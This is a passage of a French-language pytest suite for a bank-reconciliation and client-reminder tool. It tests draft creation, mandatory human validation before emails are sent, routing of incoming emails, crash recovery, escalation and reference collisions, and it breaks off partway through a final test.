"""Tests de bout en bout de l'assemblage (src/rapprochement/cycle.py, scripts/cycle.py).

Les tests marques `xfail(strict=True)` reproduisent des defauts ou contradictions
trouves dans les modules des autres experts : ils deviendront rouges le jour ou
le defaut sera corrige (il faudra alors retirer le marqueur).
"""

from __future__ import annotations

import csv
import datetime as dt
import hashlib
import os
import importlib.util
import io
import json
import pickle
import shutil
import subprocess
import sys
import time
from decimal import Decimal
from email.message import EmailMessage
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

RACINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RACINE / "src"))

from rapprochement import cycle, envoi, etats, relances  # noqa: E402
from rapprochement.audit import JournalAudit  # noqa: E402
from rapprochement.cadence import planifier  # noqa: E402
from rapprochement.depot import Depot  # noqa: E402
from rapprochement.modeles import (  # noqa: E402
    Brouillon,
    Dossier,
    EtatPeriode,
    EtatPiece,
    Evenement,
    MotifNonRoute,
    OperationBancaire,
    PieceAttendue,
    Sens,
    StatutBrouillon,
    StatutRoutage,
    identifiant_relance,
)
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.parseurs import lire_releve  # noqa: E402

PARIS = ZoneInfo("Europe/Paris")
J0 = dt.date(2026, 10, 5)            # lundi
RELAIS = "pieces@cabinet-relais.fr"
VALIDEUSE = "Marie Durand"
RESPONSABLE = "Paul Martin"


def a_10h(jour: dt.date) -> dt.datetime:
    return dt.datetime.combine(jour, dt.time(10, 0), tzinfo=PARIS)


def jour(n: int) -> dt.date:
    return J0 + dt.timedelta(days=n)


# ---------------------------------------------------------------------------
# Corpus construit
# ---------------------------------------------------------------------------

DOSSIERS = [
    ["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
    ["BETA", "Beta SAS", "contact@beta-sas.fr", "Mme Beta", "20", "courtois", "C-RELAIS", RELAIS],
    ["GAMMA", "Gamma EURL", "gerant@gamma-eurl.fr", "M. Gamma", "20", "courtois", "C-RELAIS", RELAIS],
]
OPERATIONS = [
    ["ALPHA", "2026-09-03", "CB LOXAM LOCATION", "120.00", "A-001"],
    ["ALPHA", "2026-09-17", "PRLV ORANGE PRO", "59.90", "A-002"],
    ["ALPHA", "2026-08-12", "CB BUREAU VALLEE", "75.50", "A-003"],
    ["ALPHA", "2026-09-30", "PRLV URSSAF", "812.00", "A-004"],
    ["BETA", "2026-09-10", "CB METRO CASH", "230.40", "B-001"],
    ["GAMMA", "2026-09-11", "CB CASTORAMA", "145.00", "G-001"],
]
REFS_MANQUANTES = ("A-001", "A-002", "A-003", "B-001", "G-001")


def ecrire_entree(rep: Path, *, operations=OPERATIONS, dossiers=DOSSIERS, pieces=(),
                  exclusions=None) -> Path:
    rep.mkdir(parents=True, exist_ok=True)
    with open(rep / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact",
                    "jour_echeance_tva", "ton_relance", "circuit", "email_relais"])
        w.writerows(dossiers)
    with open(rep / "releve_bancaire.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "date_operation", "date_valeur", "libelle", "debit", "credit",
                    "devise", "reference"])
        for d, date, lib, montant, ref in operations:
            w.writerow([d, date, date, lib, montant, "", "EUR", ref])
    with open(rep / "pieces_recues.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["id_piece", "dossier", "fichier", "fournisseur", "date_facture", "montant_ttc",
                    "devise", "date_reception", "canal"])
        w.writerows(pieces)
    if exclusions is not None:
        with open(rep / "exclusions_dossier.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["dossier", "motif_regex", "motif"])
            w.writerows(exclusions)
    elif (rep / "exclusions_dossier.csv").exists():
        (rep / "exclusions_dossier.csv").unlink()
    return rep


def nouvelle_instance(rep: Path, validateurs: str | None = f"{VALIDEUSE}\nPaul Martin\n") -> cycle.Instance:
    inst = cycle.Instance(rep)
    inst.preparer()
    if validateurs is not None:
        inst.validateurs.write_text(validateurs, encoding="utf-8")
        # Depuis A14, arbitrer / trancher / reparer-audit sont reserves aux RESPONSABLES : Paul
        # Martin est responsable (et validateur), Marie Durand n'est que validatrice.
        inst.responsables.write_text(f"{RESPONSABLE}\n", encoding="utf-8")
    return inst


def ecrire_eml(rep: Path, nom: str, *, expediteur: str, message_id: str, corps: str = "",
               objet: str = "Justificatif", fichiers: tuple[tuple[str, bytes], ...] = ()) -> Path:
    msg = EmailMessage()
    msg["From"] = expediteur
    msg["To"] = "pieces@cabinet.invalid"
    msg["Subject"] = objet
    msg["Message-ID"] = message_id
    msg["Date"] = "Wed, 07 Oct 2026 09:00:00 +0200"
    msg.set_content(corps)
    for nom_f, contenu in fichiers:
        msg.add_attachment(contenu, maintype="application", subtype="pdf", filename=nom_f)
    chemin = rep / nom
    chemin.write_bytes(bytes(msg))
    return chemin


@pytest.fixture
def entree(tmp_path: Path) -> Path:
    return ecrire_entree(tmp_path / "entree")


@pytest.fixture
def inst(tmp_path: Path) -> cycle.Instance:
    return nouvelle_instance(tmp_path / "instance")


def lire_csv(chemin: Path) -> list[dict[str, str]]:
    with open(chemin, encoding="utf-8", newline="") as f:
        return list(csv.DictReader(f))


def lancer(entree: Path, inst: cycle.Instance, d: dt.date, **kw) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, d, a_10h(d), **kw)


def pieces_par_ref(inst: cycle.Instance) -> dict[str, PieceAttendue]:
    return {p.reference: p for p in cycle.pieces(inst)}


def valider_et_envoyer(inst: cycle.Instance, d: dt.date) -> list[Brouillon]:
    envoyes = []
    for b in cycle.brouillons(inst, StatutBrouillon.BROUILLON):
        cycle.valider_relance(inst, b.id_relance, "marie DURAND", maintenant=a_10h(d))
        envoyes.append(cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(d)))
    return envoyes


def emls(inst: cycle.Instance) -> list[str]:
    return sorted(p.name for p in inst.outbox.glob("*.eml"))


def empreintes(racine: Path, *noms: str) -> dict[str, str]:
    resultat = {}
    for nom in noms:
        base = racine / nom
        fichiers = [base] if base.is_file() else sorted(p for p in base.rglob("*") if p.is_file())
        for f in fichiers:
            resultat[str(f.relative_to(racine))] = hashlib.sha256(f.read_bytes()).hexdigest()
    return resultat


def etat_depot(inst: cycle.Instance) -> tuple:
    with Depot(inst.depot) as d:
        return (
            d.charger_pieces(),
            d.lister_brouillons(),
            d.file_humaine(resolue=None),
            d.historique_envois(),
        )


def charger_cli():
    spec = importlib.util.spec_from_file_location("cli_cycle", RACINE / "scripts" / "cycle.py")
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


# ---------------------------------------------------------------------------
# Premier cycle : pieces, brouillons, aucune emission
# ---------------------------------------------------------------------------


def test_premier_cycle_cree_pieces_et_brouillons(entree, inst):
    resume = lancer(entree, inst, J0)
    pieces = pieces_par_ref(inst)
    assert sorted(pieces) == list(REFS_MANQUANTES)
    assert all(p.etat is EtatPiece.ATTENDUE and p.nb_relances == 0 for p in pieces.values())
    assert resume.pieces_creees == 5 and resume.brouillons_crees == 2
    bs = cycle.brouillons(inst)
    assert {b.destinataire for b in bs} == {"compta@alpha-sarl.fr", RELAIS}
    assert all(b.statut is StatutBrouillon.BROUILLON and b.valide_par == "" for b in bs)
    for nom in ("tableau_suivi.csv", "pieces_attendues.csv", "a_verifier.csv",
                "file_humaine.csv", "periodes.csv", "resume.txt"):
        assert (inst.sortie / nom).exists(), nom
    assert sorted(p.stem for p in (inst.sortie / "brouillons").glob("*.txt")) == sorted(
        b.id_relance for b in bs)
    assert JournalAudit(inst.audit).verifier().ok
    actions = [e.action for e in JournalAudit(inst.audit).lire()]
    assert actions.count("piece_creee") == 5 and actions.count("brouillon_cree") == 2
    assert actions[-1] == "cycle_termine"


def test_ca06_aucun_envoi_sans_validation(entree, inst):
    lancer(entree, inst, J0)
    bs = cycle.brouillons(inst)
    assert bs and emls(inst) == []
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, bs[0].id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, bs[0].id_relance, "Mallory", maintenant=a_10h(J0))
    assert emls(inst) == []
    assert all(b.statut is StatutBrouillon.BROUILLON for b in cycle.brouillons(inst))


@pytest.mark.parametrize("contenu", [None, "", "\n  \n# commentaire\n", "systeme\n"])
def test_validateurs_absents_ou_vides_refus(entree, tmp_path, contenu):
    inst = nouvelle_instance(tmp_path / "i", validateurs=contenu)
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    nom = "systeme" if contenu == "systeme\n" else VALIDEUSE
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, b.id_relance, nom, maintenant=a_10h(J0))
    for appel in (
        lambda: cycle.rejeter_relance(inst, b.id_relance, nom, "x", maintenant=a_10h(J0)),
        lambda: cycle.trancher_envoi(inst, b.id_relance, nom, parti=True, maintenant=a_10h(J0)),
        lambda: cycle.rattacher_piece(inst, nom, maintenant=a_10h(J0), dossier="ALPHA",
                                      reference="A-001", id_piece="P"),
        lambda: cycle.controler_piece(inst, "ALPHA", "A-001", nom, conforme=True, maintenant=a_10h(J0)),
    ):
        with pytest.raises(cycle.ValidateurRefuse):
            appel()


def test_ca06_cli(entree, inst):
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", *base, "--entree", str(entree)]) == 0
    ids = [b.id_relance for b in cycle.brouillons(inst)]
    assert emls(inst) == []
    assert cli.main(["envoyer", *base, "--par", "paul martin", ids[0]]) == 1   # pas valide
    with pytest.raises(SystemExit):
        cli.main(["envoyer", *base, ids[0]])                                # --par absent (A17)
    assert cli.main(["envoyer", *base, "--par", "Mallory", ids[0]]) == 1   # envoyeur hors liste
    assert cli.main(["valider", *base, "--par", "Mallory", ids[0]]) == 1   # hors liste
    with pytest.raises(SystemExit):
        cli.main(["valider", *base, ids[0]])                               # --par absent
    assert emls(inst) == []
    assert cli.main(["valider", *base, "--par", "paul martin", ids[0]]) == 0
    assert cli.main(["envoyer", *base, "--par", "paul martin", ids[0]]) == 0
    assert cli.main(["envoyer", *base, "--par", "paul martin", ids[0]]) == 1
    assert len(emls(inst)) == 1
    assert cli.main(["file", *base]) == 0
    assert cli.main(["verifier-audit", *base]) == 0
    assert cli.main(["exporter", *base, "--vers", str(inst.racine / "export.json")]) == 0


# ---------------------------------------------------------------------------
# CA-05 : rejeu et zero doublon d'envoi
# ---------------------------------------------------------------------------


def test_ca05_rejeu_meme_jour_memes_brouillons(entree, inst):
    r1 = lancer(entree, inst, J0)
    ids1 = sorted(b.id_relance for b in cycle.brouillons(inst))
    r2 = lancer(entree, inst, J0)
    ids2 = sorted(b.id_relance for b in cycle.brouillons(inst))
    assert ids1 == ids2 and len(ids1) == 2
    assert sorted(r1.brouillons_du_jour) == sorted(r2.brouillons_du_jour) == ids1
    assert r2.brouillons_crees == 0 and r2.pieces_creees == 0


def test_ca05_envoyer_deux_fois_un_seul_eml(entree, inst):
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert emls(inst) == [f"{b.id_relance}.eml"]
    lancer(entree, inst, J0)
    assert len(cycle.brouillons(inst)) == 2 and len(emls(inst)) == 1
    nb = {r: p.nb_relances for r, p in pieces_par_ref(inst).items() if r in b.references}
    assert set(nb.values()) == {1}


# ---------------------------------------------------------------------------
# CA-07 : chaque ligne d'un brouillon vient d'une operation du releve
# ---------------------------------------------------------------------------


def _ligne_attendue(op: OperationBancaire) -> str:
    montant = f"{op.montant:,.2f}".replace(",", " ").replace(".", ",")
    return f"  - {op.date_operation.strftime('%d/%m/%Y')}  {montant} {op.devise}  -  {op.libelle_court}"


def verifier_ca07(entree: Path, inst: cycle.Instance) -> int:
    ops = {o.reference: o for o in lire_releve(entree / "releve_bancaire.csv")}
    total = 0
    bs = cycle.brouillons(inst)
    assert bs
    for b in bs:
        lignes = [l for l in b.corps.splitlines() if l.startswith("  - ")]
        attendues = sorted(_ligne_attendue(ops[r]) for r in b.references)
        assert sorted(lignes) == attendues, b.id_relance
        for r in b.references:
            assert ops[r].dossier in b.dossiers
        total += len(lignes)
    return total


def test_ca07_lignes_reliees_au_releve(entree, inst):
    lancer(entree, inst, J0)
    assert verifier_ca07(entree, inst) == 5


# ---------------------------------------------------------------------------
# CA-08 : reproductibilite octet pour octet
# ---------------------------------------------------------------------------


def _scenario_complet(entree: Path, inst: cycle.Instance, eml_source: Path) -> None:
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    shutil.copytree(eml_source, inst.entrant, dirs_exist_ok=True)
    lancer(entree, inst, jour(2))
    lancer(entree, inst, jour(7))


def test_ca08_deux_instances_sorties_identiques(entree, tmp_path):
    emls_src = tmp_path / "emls"
    emls_src.mkdir()
    ecrire_eml(emls_src, "01.eml", expediteur="compta@alpha-sarl.fr", message_id="<m1@alpha>",
               corps="Montant : 120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF-1"),))
    ecrire_eml(emls_src, "02.eml", expediteur="inconnu@gmail.com", message_id="<m2@x>",
               fichiers=(("x.pdf", b"%PDF-2"),))
    i1 = nouvelle_instance(tmp_path / "i1")
    i2 = nouvelle_instance(tmp_path / "i2")
    _scenario_complet(entree, i1, emls_src)
    _scenario_complet(entree, i2, emls_src)
    e1 = empreintes(i1.racine, "sortie", "outbox", "audit.jsonl")
    e2 = empreintes(i2.racine, "sortie", "outbox", "audit.jsonl")
    assert len(e1) > 10 and e1 == e2
    assert etat_depot(i1) == etat_depot(i2)


# ---------------------------------------------------------------------------
# CA-10 : reprise apres panne
# ---------------------------------------------------------------------------


class Panne(RuntimeError):
    pass


def _reference(entree: Path, tmp_path: Path) -> tuple[cycle.Instance, dict, tuple]:
    ref = nouvelle_instance(tmp_path / "reference")
    lancer(entree, ref, J0)
    return ref, empreintes(ref.racine, "sortie"), etat_depot(ref)


@pytest.mark.parametrize("point", [
    "apres_repercussion", "apres_pieces", "apres_routage", "apres_transitions",
    "apres_brouillon", "avant_sorties",
])
def test_ca10_panne_au_milieu_du_cycle_puis_reprise(entree, tmp_path, point):
    _, sorties_ref, depot_ref = _reference(entree, tmp_path)
    inst = nouvelle_instance(tmp_path / "panne")

    def panne(p: str) -> None:
        if p == point:
            raise Panne(p)

    with pytest.raises(Panne):
        lancer(entree, inst, J0, panne=panne)
    lancer(entree, inst, J0)
    # resume.txt decrit les effets du cycle courant (0 piece creee a la reprise) : exclu.
    sans_resume = {k: v for k, v in empreintes(inst.racine, "sortie").items() if "resume" not in k}
    assert sans_resume == {k: v for k, v in sorties_ref.items() if "resume" not in k}
    assert etat_depot(inst) == depot_ref
    assert JournalAudit(inst.audit).verifier().ok


def test_ca10_panne_dans_sauver_brouillon(entree, tmp_path, monkeypatch):
    _, _, depot_ref = _reference(entree, tmp_path)
    inst = nouvelle_instance(tmp_path / "panne")
    original = Depot.sauver_brouillon
    appels = {"n": 0}

    def sauver_en_panne(self, b):
        appels["n"] += 1
        if appels["n"] == 2:
            raise Panne("disque plein")
        return original(self, b)

    monkeypatch.setattr(Depot, "sauver_brouillon", sauver_en_panne)
    with pytest.raises(Panne):
        lancer(entree, inst, J0)
    assert len(cycle.brouillons(inst)) == 1
    monkeypatch.setattr(Depot, "sauver_brouillon", original)
    lancer(entree, inst, J0)
    lancer(entree, inst, J0)
    assert etat_depot(inst) == depot_ref                     # aucune piece perdue, aucun doublon
    valider_et_envoyer(inst, J0)
    lancer(entree, inst, J0)
    assert len(emls(inst)) == 2 and len(cycle.brouillons(inst)) == 2
    assert all(p.nb_relances == 1 for p in cycle.pieces(inst))


def test_ca10_panne_entre_envoi_effectif_et_repercussion(entree, inst):
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    def panne(p: str) -> None:
        if p == "apres_envoi":
            raise Panne(p)

    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), panne=panne)
    assert emls(inst) == [f"{b.id_relance}.eml"]
    assert cycle.brouillons(inst, StatutBrouillon.ENVOYEE)[0].id_relance == b.id_relance
    assert all(pieces_par_ref(inst)[r].etat is EtatPiece.ATTENDUE for r in b.references)

    resume = lancer(entree, inst, J0)                         # reprise
    assert resume.envois_repercutes == 1
    pieces = pieces_par_ref(inst)
    for r in b.references:
        assert pieces[r].etat is EtatPiece.DEMANDEE and pieces[r].nb_relances == 1
        assert pieces[r].date_premiere_demande == J0
    assert [x.id_relance for x in cycle.brouillons(inst)
            if set(x.references) & set(b.references)] == [b.id_relance]   # pas de nouveau brouillon
    assert lancer(entree, inst, J0).envois_repercutes == 0   # idempotent
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert len(emls(inst)) == 1
    repercussions = [e for e in JournalAudit(inst.audit).lire() if e.action == "envoi_repercute"]
    assert len(repercussions) == 1 and repercussions[0].details["valide_par"] == VALIDEUSE


def test_ca10_panne_pendant_la_repercussion_tout_ou_rien(entree, inst, monkeypatch):
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    original = cycle._transition
    vus = {"n": 0}

    def transition_en_panne(piece, evenement, *a, **kw):
        if evenement is Evenement.RELANCE_ENVOYEE:
            vus["n"] += 1
            if vus["n"] == 2:
                raise Panne("crash au milieu de la repercussion")
        return original(piece, evenement, *a, **kw)

    monkeypatch.setattr(cycle, "_transition", transition_en_panne)
    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert all(pieces_par_ref(inst)[r].nb_relances == 0 for r in b.references)  # rollback complet
    monkeypatch.setattr(cycle, "_transition", original)
    lancer(entree, inst, J0)
    lancer(entree, inst, J0)
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    assert len(emls(inst)) == 1


def test_envoi_incertain_tranche_par_un_humain(entree, inst):
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    class Coupure:
        def envoyer(self, brouillon):
            raise TimeoutError("SMTP muet")

    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), expediteur=Coupure())
    assert cycle.brouillons(inst, StatutBrouillon.EN_COURS)[0].id_relance == b.id_relance
    lancer(entree, inst, J0)                                   # le cycle ne renvoie rien
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.trancher_envoi(inst, b.id_relance, "Mallory", parti=True, maintenant=a_10h(J0))
    cycle.trancher_envoi(inst, b.id_relance, "Paul Martin", parti=True, maintenant=a_10h(J0))
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    assert lancer(entree, inst, J0).envois_repercutes == 0


# ---------------------------------------------------------------------------
# Evolution sur plusieurs jours, jusqu'a l'escalade
# ---------------------------------------------------------------------------


def _etats(inst: cycle.Instance) -> set[tuple[EtatPiece, int]]:
    return {(p.etat, p.nb_relances) for p in cycle.pieces(inst)}


def test_evolution_sur_plusieurs_jours_jusqu_a_l_escalade(entree, inst):
    # Jour 0 : demande initiale.
    lancer(entree, inst, J0)
    assert {b.niveau for b in valider_et_envoyer(inst, J0)} == {1}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 1)}
    assert all(p.date_premiere_demande == J0 for p in cycle.pieces(inst))

    # Jour 3 (ouvre) : jalon de 3 jours ouvres atteint, mais garde-fou hebdomadaire.
    r3 = lancer(entree, inst, jour(3))
    assert r3.brouillons_du_jour == [] and r3.reportees == {"LIMITE_HEBDOMADAIRE": 2}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 1)}

    # Jour 7 : relance de niveau 2.
    r7 = lancer(entree, inst, jour(7))
    assert r7.brouillons_crees == 2
    assert {b.niveau for b in valider_et_envoyer(inst, jour(7))} == {2}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 2)}

    # Jour 10 : rien (fenetre hebdomadaire).
    assert lancer(entree, inst, jour(10)).brouillons_crees == 0

    # Jour 14 : relance de niveau 3.
    assert lancer(entree, inst, jour(14)).brouillons_crees == 2
    assert {b.niveau for b in valider_et_envoyer(inst, jour(14))} == {3}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 3)}

    # Jour 17 : 13 jours ouvres seulement, pas d'escalade, pas de relance.
    r17 = lancer(entree, inst, jour(17))
    assert r17.transitions == 0 and r17.brouillons_crees == 0
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 3)}
    assert lire_csv(inst.sortie / "escalades.csv") == []

    # Jour 18 : 14 jours ouvres depuis la premiere demande -> ESCALADE reelle.
    r18 = lancer(entree, inst, jour(18))
    assert r18.transitions == 5 and r18.brouillons_crees == 0
    assert _etats(inst) == {(EtatPiece.ESCALADEE, 3)}
    escalades = lire_csv(inst.sortie / "escalades.csv")
    assert [(l["dossier"], l["reference"]) for l in escalades] == [
        ("ALPHA", "A-003"), ("ALPHA", "A-001"), ("ALPHA", "A-002"), ("BETA", "B-001"), ("GAMMA", "G-001")]
    assert {
        k: escalades[1][k] for k in ("montant", "libelle", "nb_relances", "date_premiere_demande")
    } == {"montant": "120.00", "libelle": "CB LOXAM LOCATION", "nb_relances": "3",
          "date_premiere_demande": "2026-10-05"}

    # Plus aucune relance ensuite.
    assert lancer(entree, inst, jour(21)).brouillons_crees == 0
    assert len(emls(inst)) == 6
    assert JournalAudit(inst.audit).verifier().ok


def test_brouillon_en_attente_bloque_un_second_brouillon(entree, inst):
    lancer(entree, inst, J0)                                   # jamais valide
    r7 = lancer(entree, inst, jour(7))
    assert r7.brouillons_crees == 0
    assert r7.reportees.get(cycle.BROUILLON_EN_ATTENTE) == 2
    assert len(cycle.brouillons(inst)) == 2


def test_envoyer_refuse_un_second_email_dans_la_semaine(entree, inst):
    lancer(entree, inst, J0)
    b1 = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    b2 = Brouillon(
        id_relance=identifiant_relance(b1.destinataire, ("A-002",), 1, J0),
        destinataire=b1.destinataire, objet="Autre", corps="x", dossiers=("ALPHA",),
        references=("A-002",), niveau=1, cree_le=J0,
    )
    with Depot(inst.depot) as d:
        d.sauver_brouillon(b2)
    for b in (b1, b2):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.envoyer_relance(inst, b1.id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.EnvoiRefuse):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a_10h(J0 + dt.timedelta(days=1)))
    assert len(emls(inst)) == 1
    assert pieces_par_ref(inst)["A-002"].nb_relances == 1


# ---------------------------------------------------------------------------
# Piece reclamee puis recue, controle, periode COMPLETE
# ---------------------------------------------------------------------------


def test_piece_reclamee_puis_recue_jusqu_a_periode_complete(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    ecrire_eml(inst.entrant, "01.eml", expediteur="Compta <compta@alpha-sarl.fr>",
               message_id="<f1@alpha>", corps="Ci-joint la facture, montant 75,50 EUR.",
               fichiers=(("bureau_vallee_2026-08-12.pdf", b"%PDF-bv"),))
    r = lancer(entree, inst, jour(2))
    assert r.propositions == 1
    assert pieces_par_ref(inst)["A-003"].etat is EtatPiece.DEMANDEE   # proposition, pas confirmation
    (prop,) = cycle.lister_file(inst)
    assert prop.statut is StatutRoutage.PROPOSEE and prop.reference_operation == "A-003"

    with pytest.raises(cycle.ValidateurRefuse):
        cycle.rattacher_piece(inst, "robot", maintenant=a_10h(jour(2)), message_id=prop.message_id)
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(2)),
                              message_id=prop.message_id, empreinte=prop.empreinte[:8])
    assert p.etat is EtatPiece.RECUE and p.pieces_rattachees
    assert cycle.lister_file(inst) == []
    p = cycle.controler_piece(inst, "ALPHA", "A-003", "Paul Martin", conforme=True,
                              maintenant=a_10h(jour(2)))
    assert p.etat is EtatPiece.VALIDEE

    pieces = cycle.pieces(inst)
    aout = [x for x in pieces if x.dossier == "ALPHA" and x.periode == "2026-08"]
    sept = [x for x in pieces if x.dossier == "ALPHA" and x.periode == "2026-09"]
    assert etats.etat_periode(aout) is EtatPeriode.COMPLETE
    assert etats.etat_periode(sept) is EtatPeriode.EN_COLLECTE

    lancer(entree, inst, jour(7))
    with open(inst.sortie / "periodes.csv", encoding="utf-8") as f:
        lignes = {(l["dossier"], l["periode"]): l["etat"] for l in csv.DictReader(f)}
    assert lignes[("ALPHA", "2026-08")] == "complete"
    assert all("A-003" not in b.references for b in cycle.brouillons(inst) if b.cree_le == jour(7))


def test_controle_non_conforme_relance_de_nouveau(entree, inst):
    lancer(entree, inst, J0)
    cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(J0), dossier="ALPHA",
                          reference="A-001", id_piece="P-1")
    with pytest.raises(etats.TransitionInterdite):
        cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=False, motif="",
                              maintenant=a_10h(J0))
    p = cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=False,
                              motif="illisible", maintenant=a_10h(J0))
    assert p.etat is EtatPiece.DEMANDEE and p.pieces_rattachees == ()


# ---------------------------------------------------------------------------
# Circuit C-RELAIS
# ---------------------------------------------------------------------------


def test_relais_un_seul_email_pour_deux_dossiers(entree, inst):
    lancer(entree, inst, J0)
    (b,) = [b for b in cycle.brouillons(inst) if b.destinataire == RELAIS]
    assert b.dossiers == ("BETA", "GAMMA") and b.references == ("B-001", "G-001")
    assert "Beta SAS" in b.corps and "Gamma EURL" in b.corps
    valider_et_envoyer(inst, J0)
    assert len([n for n in emls(inst) if n.startswith(b.id_relance)]) == 1


def test_relais_jamais_rattache_automatiquement(entree, inst):
    lancer(entree, inst, J0)
    ecrire_eml(inst.entrant, "r.eml", expediteur=RELAIS, message_id="<r1@relais>",
               corps="Facture Metro 230,40 EUR", fichiers=(("metro_2026-09-10.pdf", b"%PDF-m"),))
    r = lancer(entree, inst, jour(1))
    assert r.propositions == 0 and r.non_routees == 1
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.NON_ROUTEE and d.motif is MotifNonRoute.DOSSIER_INCONNU
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE


# ---------------------------------------------------------------------------
# Messages entrants : doublon, sans piece jointe, expediteur inconnu
# ---------------------------------------------------------------------------


def test_messages_entrants_chacun_au_bon_endroit(entree, inst):
    lancer(entree, inst, J0)
    e = ecrire_eml(inst.entrant, "01.eml", expediteur="compta@alpha-sarl.fr", message_id="<d@a>",
                   corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF-l"),))
    shutil.copy(e, inst.entrant / "02.eml")                   # deux e-mails identiques
    ecrire_eml(inst.entrant, "03.eml", expediteur="compta@alpha-sarl.fr", message_id="<vide@a>",
               corps="Je vous envoie ca demain")
    ecrire_eml(inst.entrant, "04.eml", expediteur="quelquun@gmail.com", message_id="<g@g>",
               corps="59,90 EUR", fichiers=(("orange.pdf", b"%PDF-o"),))
    r = lancer(entree, inst, jour(1))
    assert (r.messages_lus, r.propositions, r.non_routees, r.doublons) == (4, 1, 2, 1)
    file = cycle.lister_file(inst)
    assert [(d.statut, d.motif, d.reference_operation) for d in file] == [
        (StatutRoutage.PROPOSEE, None, "A-001"),
        (StatutRoutage.NON_ROUTEE, MotifNonRoute.SANS_PIECE_JOINTE, None),
        (StatutRoutage.NON_ROUTEE, MotifNonRoute.DOSSIER_INCONNU, None),
    ]
    with open(inst.sortie / "file_humaine.csv", encoding="utf-8") as f:
        assert len(list(csv.DictReader(f))) == 3
    r2 = lancer(entree, inst, jour(1))                         # rejeu : aucun effet
    assert (r2.propositions, r2.non_routees, r2.doublons) == (0, 0, 4)
    assert cycle.lister_file(inst) == file
    assert all(p.etat is EtatPiece.ATTENDUE for p in cycle.pieces(inst))


# ---------------------------------------------------------------------------
# Collisions de reference
# ---------------------------------------------------------------------------


def test_collision_de_reference_refuse_le_cycle(tmp_path, inst):
    ops = OPERATIONS + [["BETA", "2026-09-12", "CB LEROY MERLIN", "99.00", "A-001"]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    with pytest.raises(cycle.CollisionReferences) as exc:
        lancer(entree, inst, J0)
    assert exc.value.collisions == {"A-001": ("ALPHA", "BETA")}
    assert "A-001" in str(exc.value) and "BETA" in str(exc.value)
    assert not inst.depot.exists() and cycle.pieces(inst) == []


def test_collision_entre_releve_et_depot(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    ops = [["BETA", "2026-10-01", "CB LEROY MERLIN", "99.00", "A-002"]]
    entree2 = ecrire_entree(tmp_path / "e2", operations=ops)
    avant = etat_depot(inst)
